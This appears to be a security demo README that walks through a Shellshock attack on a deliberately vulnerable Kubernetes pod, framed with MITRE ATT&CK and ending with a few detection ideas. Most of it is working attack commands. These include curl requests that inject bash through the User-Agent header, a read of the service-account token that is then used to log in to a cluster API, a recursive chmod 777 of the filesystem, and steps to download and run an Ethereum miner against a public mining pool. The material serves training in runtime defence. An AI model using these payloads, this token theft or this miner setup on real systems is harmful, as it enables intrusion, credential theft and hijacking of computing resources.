# Initial Access to Credential Discovery to Privledge escalation and Impact

This demonstration will showcase initial access as part of the MITRE ATT&CK framework. This will showcase Exploition of a Public-Facing Application insight of a container image and 


This demo will also showcase practical security controls with a focus on runtime security controls. 

## What is shellshock?

Improper input validation bash code allowed users to put trailing commands after the definition of environment variables. 

You read this and first think - what uses environment variables.....crap. TONS OF THINGS! SSH, Apache modules, etc.

This meant remote code execution on apaches mod_cgi(d) library used in web servers.

CGI stands for Common Gateway Interface. It is a way to let Apache execute script files and send the
output to the client. So we just need something that will use bash.


# Demo Script


## Setup

This setup will provide the foundational layer and jumping point from which you will attck Kubernetes. It will also deploy a target pod that we will move to in order to steal sensitive data. 


### Deploy Vulnerable Pod for Initial Access

*Note: It's important that this is not exposed to the public internet and highly reccomended to never be run in privlegded mode. (You will actually be hacked if running in privledged mode and publically expose this)* It's reccomended that when using this you only port forward.


1. Deploy a vulnerable pod based on the vulnerables docker repo shellshock vulnerability. This will be our initial access point for the attack. 

```
kubectl run shellshock --labels=app=shellshock,team=evilcasper --image=vulnerables/cve-2014-6271 -n default
```

```
oc exec -it shellshock -- sh 
```

Cheat so you have permissions:

```
chmod 777 -R  /
```

```
chown www-data:www-data -R /
```

```
exit
```


2. Port forward to the pod so that you don't expose a pod vulnerable to shellshock to a network attack vector. 

```
kubectl port-forward shellshock 8080:80 -n default &
```

## Prelude 

You are playing the role of an attacker targeting an externally facing website. 

### Exploit and gather information.

3. Test to ensure that you can exploit

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo "pwnage"'" \
http://localhost:8080/cgi-bin/vulnerable

```

Sad can't do all the things.


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" \
http://localhost:8080/cgi-bin/vulnerable


Check if I can get access to secrets or find out more about the environment. 

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'env'" \
http://localhost:8080/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls -ltr /bin/'" \
http://localhost:8080/cgi-bin/vulnerable

Okay this looks limited. Am I a container? Lets check if I can access a service account secret.


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'" \
http://localhost:8080/cgi-bin/vulnerable

PWNAGE.

Ultimately you don't have enough permissions to escape because you are the www-data user. However, if you are the root user in a container this is a different story.

Assume you actually know what the Kubernetes API server endpoint is. You now have enough information to authenticate to the API server.

EXIT

export TOKEN=<insert-token>

oc login https://api.js-09-14-sweet-drawer-water.openshift.infra.rox.systems:6443 --token=$TOKEN 

So what can I do. I don't want to set off a ton of alarms so I need to figure out who I am and what permissions I have before I start doing things. I'll do this a bit more slowly.

kubectl auth can-i create po/exec

kubectl auth can-i create po

So I can create pods and I can exec into them. Exec is means of execution.

Lets go back to shellshock to see what I could have done if I were root.

apt-get install wget

Okay so it looks like I can't reach out because I'm using an older package system. So I need to update this. Lets delete the package source list

rm /etc/apt/sources.list

Lets update the package source list

printf "deb http://archive.debian.org/debian wheezy main\ndeb http://security.debian.org/debian-security wheezy/updates main\n" >> /etc/apt/sources.list

Update everything so I can download packages.

apt-get update

And now I can download tools to laterally move and download tools.

apt-get install wget curl -y

So at this point it really depends what I want to do. Now that I've downloaded tools I need I can use them to do a ton of things. wget to download other tools. curl make api calls. oc to interface with an openshift or kubernetes api.

So now I'm going to install a cryptominer.

First I'll go to /tmp

cd /tmp

And then I'm going to download ethminer a popular solution used to miner etherium.

wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz

Unzip that.

tar -xvzf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz


/bin/ethminer --farm-retries 9999 -U --farm-recheck -P stratum1+ssl://ETH_WALLET.WORKERNAME@us2.ethermine.org:5555

Now I can have some fun. All I need to do is replace ETH_WALLET with my wallet, which is used to pay me and my workername

Worker names are used by mining pools to identify your account and the hashrate contribution of each individual miner.

A mining farm is a location, usually a large space, housing several computers dedicated to mining one or more cryptocurrencies.

Stratum1+ssl is the protocol used with encryption.

Check site. Port forward if needed.

Now lets review what I did from a security perspective.

1. I tested that I had access, checked who I was and looked for addtional information. So I could have monitored for a few commands that my app reasonably never would have ran.

- env
- whoami

2. I did an ingress tool transfer that allowed me to ge the tools I needed for an attack. I can monitor for commands that do this as well.

- wget
- curl
- apt-get
- yum

3. I accessed the Kubernetes API server and ran malcious code through execs. I can block execs directly and monitor activity from execs.
